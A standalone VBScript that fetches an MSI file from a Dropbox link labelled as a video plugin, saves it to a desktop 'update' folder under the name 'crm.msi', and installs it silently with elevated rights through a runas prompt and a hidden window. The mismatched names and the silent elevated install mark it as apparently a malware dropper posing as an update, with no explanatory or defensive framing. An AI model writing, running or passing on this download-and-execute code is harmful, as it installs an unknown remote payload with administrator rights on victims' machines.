Option Explicit

Dim url, savePath, desktopPath, updateFolder
url = "https://dl.dropboxusercontent.com/scl/fi/blssqea2s5ainp07jz725/ViedoPluginx64.msi?rlkey=7vz1zd2lrkk9hiwkyorczly56&st=79kptbmn&dl=1"

Dim fso, shell
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Get desktop path and create update folder
desktopPath = shell.SpecialFolders("Desktop")
updateFolder = desktopPath & "\update"

' Create update folder if it doesn't exist
If Not fso.FolderExists(updateFolder) Then
    fso.CreateFolder updateFolder
End If

' Set save path in update folder
savePath = updateFolder & "\crm.msi"

' Delete existing MSI if it exists
If fso.FileExists(savePath) Then fso.DeleteFile savePath, True

Dim http, stream
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", url, False
http.Send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile savePath, 2 ' 2 = overwrite if exists
    stream.Close
    
    ' Wait briefly for file write to complete
    WScript.Sleep 2000
    
    ' Use ShellExecute to trigger the Windows Installer UAC prompt
    Dim objShellApp
    Set objShellApp = CreateObject("Shell.Application")
    
    ' This will trigger the legitimate Windows Installer UAC elevation prompt
    ' Using /quiet for completely silent installation (no UI)
    objShellApp.ShellExecute "msiexec", "/i """ & savePath & """ /quiet", "", "runas", 0
    
Else
    MsgBox "Download failed. Status: " & http.Status, vbCritical, "Error"
    WScript.Quit
End If